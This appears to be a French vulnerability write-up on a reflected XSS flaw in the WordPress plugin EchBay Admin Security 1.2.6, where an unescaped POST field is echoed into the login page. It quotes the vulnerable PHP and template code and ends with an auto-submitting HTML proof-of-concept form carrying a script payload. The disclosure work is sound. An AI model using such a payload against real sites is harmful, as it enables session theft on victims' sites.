---
title: "Cross-Site Scripting (reflected) dans le plugin Wordpress EchBay Admin Security"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin [EchBay Admin Security](https://wordpress.org/plugins/echbay-admin-security/) se présente de cette façon :

> If you run a WordPress website, you should absolutely use echbay-admin-security to secure it against hackers.
>
> Protect WP-Admin fixes a glaring security hole in the WordPress community: the well-known problem of the admin panel URL.
Everyone knows where the admin panel, and this includes hackers as well.
> 
> Protect WP-Admin helps solve this problem by allowing webmasters to setup PIN number or password for login page.
> 
> The plugin also comes with some access filters, allowing webmasters to restrict guest and registered users access to wp-admin, just in case you want some of your editors to log in the classic way.

La version testée est la 1.2.6 et date d'il y a 1 mois au moment de ces lignes.

## La vulnérabilité

Le script `eas.php` définie une classe comportant différentes méthodes, mais aussi différentes fonctions indépendantes :

```php
if (!class_exists('EAS_Actions_Module')) {                                                                             
    class EAS_Actions_Module                                                                                           
    {                                                                                                                  
        var $eb_plugin_data = '2222';                                                                                  
        public $optionName = '_eas_token_for_admin_url';                                                               
        public $optionGroup = 'eas-options-group';                                                                     
        public $defaultOptions = [];                                                                                   
        public $defaultNameOptions = [];                                                                               
        public $my_settings = [];                                                                                      
        public $plugin_page = 'echbay-admin-security';
--- snip ---
    function EBE_show_form_enter_pin($msg = '')                                                                        
    {                                                                                                                  
        ob_end_clean();                                                                                                
        $rand_iname = EAS_ARIA_REQUIRED[rand(0, count(EAS_ARIA_REQUIRED) - 1)];                                        
        $rand_ivalue = EAS_my_mdnam($rand_iname);                                                                      
                                                                                                                       
        if ($rand_iname == 'email') {                                                                                  
            $rand_ivalue .= '@' . $_SERVER['HTTP_HOST'];                                                               
        }                                                                                                              
                                                                                                                       
        $result = file_get_contents(__DIR__ . '/404.html', 1);                                                         
        $to = time() + rand(3000, 3600);                                                                               
        foreach ([                                                                                                     
            'iname' => EAS_HIDDEN_CAPTCHA,                                                                             
            'to' => $to,                                                                                               
            'token' => EAS_my_mdnam($to),                                                                              
            'sid' => substr(EAS_SESSION_ID, rand(0, strlen(EAS_SESSION_ID) - 6), 6),                                   
            'rand_iname' => $rand_iname,                                                                               
            'rand_ivalue' => $rand_ivalue,                                                                             
            'ebnonce' => isset($_POST['_ebnonce']) ? $_POST['_ebnonce'] : '',                                          
            'msg' => $msg,                                                                                             
            'base_url' => get_home_url(),                                                                              
        ] as $k => $v) {                                                                                               
        $result = str_replace('{' . $k . '}', $v, $result); }                                                          
        die($result);                                                                                                  
    }
```

La fonction `EBE_show_form_enter_pin` contient le code vulnérable. Elle va extraire le contenu du fichier `404.html` que voici :

```html
--- snip ---
<h2>Login security</h2>
{msg}
<form action="" method="post">
  <div style="position: absolute; left: -9999px; opacity: 0;">
    <input type="text" name="{iname}_name" value="" />
    <input type="email" name="{iname}_email" value="" />
    <input type="text" name="{iname}_phone" value="" />
    <input type="text" name="{iname}_address" value="" />
    <input type="text" name="{iname}_captcha" value="" />
    <input type="text" name="{iname}_sid" value="{sid}" aria-required="true" required />
    <input type="text" name="{iname}_to" value="{to}" aria-required="true" required />
    <input type="text" name="{iname}_token" value="{token}" aria-required="true" required />
    <input type="text" name="{iname}_fjs" value="" aria-required="true" required />
  </div>
  <div>
    <input type="text" name="_ebnonce" value="{ebnonce}" placeholder="Enter your PIN/ Password" autofocus aria-required="true" required /></div>
  <br>
  <div><button type="submit">Confirm</button></div>
  <br>
  <div><a href="{base_url}" style="text-decoration: none;">&larr; Back to homepage</a>
</div>
</form>
--- snip ---
```

On voit que ce code contient différentes entrées entre accolades, comme un langage de template, sauf qu'ici, c'est la fonction `EBE_show_form_enter_pin` qui se charge de remplacer les chaines une à une :

```php
foreach ([                                                                                                     
    'iname' => EAS_HIDDEN_CAPTCHA,                                                                             
    'to' => $to,                                                                                               
    'token' => EAS_my_mdnam($to),                                                                              
    'sid' => substr(EAS_SESSION_ID, rand(0, strlen(EAS_SESSION_ID) - 6), 6),                                   
    'rand_iname' => $rand_iname,                                                                               
    'rand_ivalue' => $rand_ivalue,                                                                             
    'ebnonce' => isset($_POST['_ebnonce']) ? $_POST['_ebnonce'] : '',                                          
    'msg' => $msg,                                                                                             
    'base_url' => get_home_url(),                                                                              
] as $k => $v) {                                                                                               
$result = str_replace('{' . $k . '}', $v, $result); }   
```

Et on remarque que `$_POST['_ebnonce']` remplace le placeholder `{ebnonce}` sans échappement préalable des caractères HTML.

La fonction est appelée depuis le code principal que je ne donnerais pas dans sa totalité en raison de sa longueur :

```php
else if (strpos($_SERVER['REQUEST_URI'], '/wp-login.php') !== false) {                                             
    $EAS_func = new EAS_Actions_Module();                                                                          
    $ebe_guest_token = get_option($EAS_func->optionName);                                                          
    if (empty($ebe_guest_token)) {                                                                                 
        $ebe_guest_token = $EAS_func->eb_plugin_data;                                                              
    }                                                                                                              
                                                                                                                   
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {                                                                    
        if (isset($_POST['_ebnonce'])) {           
--- snip ---
            if ($has_value === 1 && $this_bot === false && $_POST['_ebnonce'] == $ebe_guest_token) {               
                $redirect_to = (isset($_GET['redirect_to']) ? $_GET['redirect_to'] : '');                          
                $confirm_to = get_home_url() . '/wp-login.php?ebe_token=' . EBE_md5_guest_token($ebe_guest_token); 
                if ($redirect_to != '') {                                                                          
                    $confirm_to .= '&redirect_to=' . urlencode($redirect_to); }                                    
                die(header('Location: ' . $confirm_to)); }                                                         
                else {                                                                                             
                    EBE_show_form_enter_pin('<p style="color: red;">PIN/ Password incorrect! Please try again...</p>');
                }
--- snip ---
```

Ce sera suffisant pour comprendre comment former notre PoC HTML :

```html
<html>
<body>
<form id="myForm" method="POST" action="http://localhost:8000/wp-login.php">
        <input type="hidden" name="_ebnonce" value="&quot;&gt;&lt;ScRiPt&gt;alert(&#x27;XSS&#x27;)&lt;/sCrIpT&gt;" />
</form>
<script>document.createElement('form').submit.call(document.getElementById('myForm'));</script>
</body>
</html>
```
